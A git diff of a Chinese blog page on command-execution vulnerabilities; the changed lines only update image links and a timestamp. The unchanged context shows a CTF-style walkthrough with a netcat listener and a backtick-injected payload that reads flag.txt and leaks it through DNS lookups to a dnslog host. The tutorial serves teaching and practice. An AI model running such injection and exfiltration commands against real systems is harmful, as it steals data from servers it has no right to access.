@@ -94,11 +94,11 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/08/zmWCqdPSxNXf5vZ.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/YNC3swOLeXTEAgQ.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/q7ukZA5iTmPjCLx.png">
-<meta property="og:image" content="http://yoursite.com/2020/02/08/命令执行漏洞整理/imgs/risfIC8glTWBLcu.png">
-<meta property="og:image" content="https://i.loli.net/2020/02/10/4pNKlSX6Ls5QTxj.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/02/10/clSphRoJ1u3meBZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/10/iLlGmTegSbunOQw.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/02/08/wLl7ZIpSE29ihev.png">
-<meta property="og:image" content="http://yoursite.com/2020/02/08/命令执行漏洞整理/imgs/1581170146264.png">
-<meta property="og:updated_time" content="2020-02-10T08:27:48.167Z">
+<meta property="og:image" content="https://i.loli.net/2020/02/10/hAL9WPide8a6Gjg.png">
+<meta property="og:updated_time" content="2020-02-10T09:08:35.024Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="命令执行漏洞整理">
 <meta name="twitter:description" content="命令执行漏洞的成因是，由于没有针对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并提交服务器执行。">
@@ -439,17 +439,17 @@
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv <span class="number">8080</span></span><br></pre></td></tr></table></figure>
 <p>收到请求则证明存在命令执行。</p>
 <h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>请求内容换成 从服务器读取的数据 之后可以看到从dnslog上看到请求结果</p>
-<p><img src="/2020/02/08/命令执行漏洞整理/imgs/risfIC8glTWBLcu.png" alt="QQ图片20200208195518.png"></p>
+<p><img src="https://i.loli.net/2020/02/10/clSphRoJ1u3meBZ.png" alt="risfIC8glTWBLcu.png"></p>
 <p>你可能会问 为什么不直接<code>flag.txt</code>……..</p>
 <p>脑子不好用 把PHP写成了 txt 只是个例子  自己把它当成flag.php就好了</p>
-<p><img src="https://i.loli.net/2020/02/10/4pNKlSX6Ls5QTxj.jpg" alt="QQ图片20200210153040.jpg"></p>
+<p><img src="https://i.loli.net/2020/02/10/iLlGmTegSbunOQw.jpg" alt="QQ图片20200210153040.jpg"></p>
 <p>ping的话发送的是dns请求那么dnslog肯定是可以用的</p>
 <p><img src="https://i.loli.net/2020/02/08/wLl7ZIpSE29ihev.png" alt="QQ图片20200208215236.png"></p>
 <p>请求内容里不能包含空格 我们在请求dnslog的时候应该替换一下</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping<span class="built_in"> aaa </span>bbb.dns.log 因为这样是不可以ping的 地址不应该包含空格</span><br></pre></td></tr></table></figure>
 <p>这里将空格替换成666</p>
 <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`cat flag.txt|sed s/<span class="string">[[:space:]]</span>/<span class="number">666</span>/`.test.dnslog.link</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/02/08/命令执行漏洞整理/imgs/1581170146264.png" alt="1581170146264"></p>
+<p><img src="https://i.loli.net/2020/02/10/hAL9WPide8a6Gjg.png" alt="1581170146264.png"></p>
 <p>访问一下拿到了flag。</p>
 
       
